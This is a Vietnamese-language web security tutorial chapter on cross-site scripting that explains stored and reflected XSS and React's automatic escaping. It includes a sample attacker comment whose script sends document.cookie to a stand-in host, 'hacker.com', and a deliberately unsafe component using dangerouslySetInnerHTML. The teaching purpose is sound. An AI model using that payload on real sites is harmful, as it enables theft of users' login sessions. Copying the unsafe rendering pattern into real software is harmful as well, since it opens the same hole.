03 XSS (Cross-Site Scripting)

Chèn mã JavaScript độc hại vào trang web mà nạn nhân khác sẽ vô tình chạy khi truy cập.

Cách kẻ tấn công khai thác

binh_luan_doc_hai.txt 
Kẻ tấn công đăng bình luận trên blog:
<script>
  fetch('https://hacker.com/steal?cookie=' + document.cookie);
</script>

Nếu trang web hiển thị bình luận này TRỰC TIẾP mà không xử lý gì,
đoạn script sẽ CHẠY THẬT trên trình duyệt của MỌI người xem trang -
gửi cookie đăng nhập của họ về máy chủ kẻ tấn công

Cách phòng chống

phong_chong_xss.jsx 
// React TỰ ĐỘNG escape nội dung khi render - AN TOÀN mặc định
function BinhLuan({ noiDung }) {
    return <p>{noiDung}</p>;      // React tự escape, script sẽ hiện thành TEXT thô, không chạy
}

// NGUY HIỂM - dangerouslySetInnerHTML bỏ qua cơ chế bảo vệ tự động của React
function BinhLuanNguyHiem({ noiDung }) {
    return <p dangerouslySetInnerHTML={{ __html: noiDung }} />;   // CHỈ dùng khi ĐÃ lọc noiDung kỹ càng
}
Loại XSSMô tả
Stored XSSMã độc được LƯU trong database (VD: bình luận), chạy mỗi khi ai đó xem trang
Reflected XSSMã độc nằm trong URL, chỉ chạy khi nạn nhân bấm vào link độc hại đó
Quan trọng
Các framework hiện đại (React, Vue) tự động escape nội dung khi render — đây là lý do XSS ít phổ biến hơn nhiều so với thời kỳ jQuery/HTML thuần trước đây. Rủi ro chủ yếu xuất hiện khi cố tình "vượt qua" cơ chế bảo vệ này (như dangerouslySetInnerHTML).

📌 Tổng kết chương 3

XSS chèn JavaScript độc hại chạy trên trình duyệt nạn nhân. React/Vue tự động escape nội dung khi render, giúp phòng chống mặc định — chỉ nguy hiểm khi chủ động bỏ qua cơ chế này.
